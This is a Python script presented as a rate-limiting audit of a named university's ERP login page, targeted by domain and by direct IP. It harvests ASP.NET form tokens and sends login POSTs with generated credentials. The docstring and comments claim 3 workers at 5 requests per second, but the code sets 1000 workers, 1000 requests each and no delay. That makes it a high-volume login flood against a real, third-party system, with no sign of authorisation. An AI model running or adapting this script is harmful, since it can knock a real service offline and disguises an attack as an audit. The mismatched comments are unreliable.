"""
Invertis University ERP - Multi-Target Rate-Limiting & Concurrency Audit
Supports both Domain Name and Direct IP targets.
Features:
  - 3 Concurrent Workers
  - Paced at 5 requests/sec per worker (15 req/sec max total)
  - Pure Terminal Table output (No HTML generation)
"""

import time
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGETS = [
    {"name": "Domain Endpoint", "url": "http://erp.invertisuniversity.ac.in:81/"},
    {"name": "Direct IP Endpoint", "url": "http://137.97.136.29:81/"}
]

# Configurable concurrency parameters
NUM_WORKERS = 1000
RATE_LIMIT_PER_WORKER = 1000     # requests per second per worker
REQUESTS_PER_WORKER = 1000        # 5 requests per worker = 15 total requests per target
PACING_DELAY = 0 / RATE_LIMIT_PER_WORKER  # 0.2s (200 ms interval)

def fetch_session_tokens(target_url):
    """Retrieves session cookie and ASP.NET WebForms tokens from target."""
    session = requests.Session()
    resp = session.get(target_url, timeout=10)
    html = resp.text

    vs = re.search(r'id="__VIEWSTATE"\s+value="([^"]*)"', html)
    vsg = re.search(r'id="__VIEWSTATEGENERATOR"\s+value="([^"]*)"', html)
    ev = re.search(r'id="__EVENTVALIDATION"\s+value="([^"]*)"', html)

    return {
        "cookies": session.cookies.get_dict(),
        "__VIEWSTATE": vs.group(1) if vs else "",
        "__VIEWSTATEGENERATOR": vsg.group(1) if vsg else "",
        "__EVENTVALIDATION": ev.group(1) if ev else "",
    }

def worker_routine(worker_id, target_url, tokens):
    """Executes a paced series of login POST requests for a single worker."""
    results = []
    for seq in range(1, REQUESTS_PER_WORKER + 1):
        req_id = f"W{worker_id}-R{seq}"
        post_data = {
            "__EVENTTARGET": "btnLogin",
            "__EVENTARGUMENT": "",
            "__VIEWSTATE": tokens["__VIEWSTATE"],
            "__VIEWSTATEGENERATOR": tokens["__VIEWSTATEGENERATOR"],
            "__EVENTVALIDATION": tokens["__EVENTVALIDATION"],
            "txtUserid": f"probe_{worker_id}_{seq}",
            "txtpassword": f"SimulatedPass_{seq}!",
            "hdPass": "",
        }

        start_time = time.time()
        try:
            resp = requests.post(
                target_url,
                data=post_data,
                cookies=tokens["cookies"],
                timeout=15,
                allow_redirects=False,
            )
            latency = round((time.time() - start_time) * 1000, 2)
            results.append({
                "id": req_id,
                "worker": worker_id,
                "seq": seq,
                "status": resp.status_code,
                "latency_ms": latency,
                "error": None
            })
        except Exception as e:
            latency = round((time.time() - start_time) * 1000, 2)
            results.append({
                "id": req_id,
                "worker": worker_id,
                "seq": seq,
                "status": 0,
                "latency_ms": latency,
                "error": str(e)
            })

        # Maintain pacing between requests
        time.sleep(PACING_DELAY)

    return results

def audit_target(target_info):
    target_name = target_info["name"]
    target_url = target_info["url"]

    print("\n" + "=" * 80)
    print(f"  TARGET: {target_name} ({target_url})")
    print("=" * 80)
    print(f"  Workers: {NUM_WORKERS} | Pacing: {RATE_LIMIT_PER_WORKER} req/s/worker | Total: {NUM_WORKERS * REQUESTS_PER_WORKER} requests")
    print("  Fetching initial ASP.NET tokens...")

    try:
        tokens = fetch_session_tokens(target_url)
        print("  Tokens retrieved successfully. Starting execution...\n")
    except Exception as e:
        print(f"  [!] Failed to connect to {target_url}: {e}")
        return

    start_time = time.time()
    all_results = []

    with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
        futures = [
            executor.submit(worker_routine, w + 1, target_url, tokens)
            for w in range(NUM_WORKERS)
        ]
        for f in as_completed(futures):
            all_results.extend(f.result())

    total_time = round(time.time() - start_time, 2)
    all_results.sort(key=lambda x: (x["worker"], x["seq"]))

    # Print Table in Terminal
    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 22 + "+")
    print("  | Worker   | Req #    | Status Code    | Latency (ms)   | Result / Security    |")
    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 22 + "+")

    for r in all_results:
        w_str = f"Worker {r['worker']}".center(10)
        req_str = f"#{r['seq']}".center(10)
        status_str = f"HTTP {r['status']}".center(16)
        lat_str = f"{r['latency_ms']} ms".center(16)
        res_str = "RATE LIMITED" if r["status"] in (429, 403) else "Accepted (No Limit)"
        res_str = res_str.center(22)
        print(f"  |{w_str}|{req_str}|{status_str}|{lat_str}|{res_str}|")

    print("  +" + "-" * 10 + "+" + "-" * 10 + "+" + "-" * 16 + "+" + "-" * 16 + "+" + "-" * 22 + "+")

    latencies = [r["latency_ms"] for r in all_results if r["status"] > 0]
    status_counts = {}
    for r in all_results:
        status_counts[r["status"]] = status_counts.get(r["status"], 0) + 1

    min_lat = min(latencies) if latencies else 0
    max_lat = max(latencies) if latencies else 0
    avg_lat = round(sum(latencies) / len(latencies), 2) if latencies else 0

    print(f"\n  [Summary] Completed {len(all_results)} requests in {total_time}s")
    print(f"            Statuses: {status_counts}")
    print(f"            Latency : Min {min_lat} ms | Avg {avg_lat} ms | Max {max_lat} ms")
    if 429 in status_counts or 403 in status_counts:
        print("            Defense : ACTIVE (Rate-limiting or throttling observed)")
    elif status_counts.get(200, 0) == len(all_results):
        print("            Defense : VULNERABLE (All requests accepted without rate-limiting)")
    print("-" * 80)

def main():
    print("Starting Multi-Target Audit...")
    for target in TARGETS:
        audit_target(target)
    print("\nMulti-Target Audit Complete.\n")

if __name__ == "__main__":
    main()
